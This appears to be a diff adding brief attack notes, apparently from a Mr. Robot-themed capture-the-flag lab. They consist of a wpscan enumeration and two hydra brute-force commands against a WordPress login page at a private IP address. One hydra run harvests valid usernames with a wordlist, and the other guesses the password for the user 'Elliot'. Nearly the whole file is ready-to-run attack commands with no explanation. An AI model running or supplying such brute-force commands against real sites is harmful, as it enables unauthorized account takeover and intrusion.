@@ -1,0 +1,5 @@
+wpscan --url http://10.10.66.104 -e
+
+hydra -L fsocity.dic -p test 10.10.66.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+hydra -l Elliot -P fsocity.dic 10.10.66.104 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30 
